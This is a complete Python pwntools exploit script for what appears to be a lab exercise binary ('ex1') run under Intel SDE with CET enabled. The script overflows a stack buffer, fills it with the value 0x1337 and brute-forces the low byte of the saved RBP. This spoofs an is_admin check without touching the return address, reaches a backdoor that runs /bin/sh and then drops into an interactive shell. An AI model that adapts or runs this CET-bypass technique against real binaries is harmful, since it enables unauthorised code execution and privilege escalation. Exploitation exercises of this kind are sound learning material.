#!/usr/bin/env python3
from pwn import *
import sys

# === Configuration ===
context.arch = 'amd64'
context.log_level = 'warning'

BINARY = "./bin/ex1"
# Ensure this matches your actual SDE path from the unzipped folder
SDE_PATH = "./sdekit/sde64" 
SDE_ARGS = ["-no-follow-child", "-cet", "-cet_output_file", "/dev/null", "--"]

def exploit():
    print("[*] CET Bypass Exploit for Exercise 1")
    print("[*] Technique: Data-Only Attack (Saved RBP Corruption)")
    print("[*] Goal: Spoof 'is_admin' without touching Return Address")

    # Brute-force stack alignment (LSB 0x00 - 0xF8)
    # We need the fake RBP to align such that [RBP-4] lands in our 0x1337 buffer.
    for byte in range(0, 256, 8):
        p = None
        try:
            # Launch with Intel SDE to simulate CET
            cmd_line = [SDE_PATH] + SDE_ARGS + [BINARY]
            p = process(cmd_line)
            
            p.recvuntil(b"> ", timeout=1)
            
            # === Payload Construction ===
            # Buffer 'cmd' is at RBP - 48.
            # We want to fill the stack with our target value (0x1337).
            # We start with "AAAA" to fail the strncmp checks and trigger an immediate return.
            
            # 1. Fill buffer with target value 0x1337
            #    4 bytes "AAAA" + 11 ints * 4 bytes = 48 bytes total
            payload = b"AAAA" + p32(0x1337) * 11
            
            # 2. Overwrite Saved RBP (Offset 48)
            #    We only modify the LSB to shift the stack frame slightly.
            payload += p8(byte)
            
            # 3. Pad the rest (do not touch Return Address at Offset 56!)
            #    Actually, read() just stops, so we don't strictly need to pad 
            #    unless we wanted to be precise. Writing just the byte is safer 
            #    to avoid accidental overflow into Ret Addr if offsets were wrong.
            
            p.send(payload)
            
            # === Verification ===
            # If successful, main() calls backdoor() -> execv("/bin/sh")
            
            # Clean buffer
            try:
                p.clean(timeout=0.1)
            except:
                pass

            # Attempt to run a command
            p.sendline(b"echo PWN_SUCCESS")
            
            # Check response
            resp = p.recv(timeout=0.5)
            
            if b"PWN_SUCCESS" in resp:
                print(f"\n[+] SUCCESS! Stack pivoted with LSB: {hex(byte)}")
                print("[*] CET Bypassed. Enjoy your shell.")
                p.interactive()
                return
            
            p.close()
            sys.stdout.write(f"\r[-] Trying LSB {hex(byte)}... ")
            sys.stdout.flush()
            
        except Exception:
            if p: p.close()
            continue

    print("\n[-] Exploit failed. Please verify SDE path and binary offsets.")

if __name__ == "__main__":
    exploit()
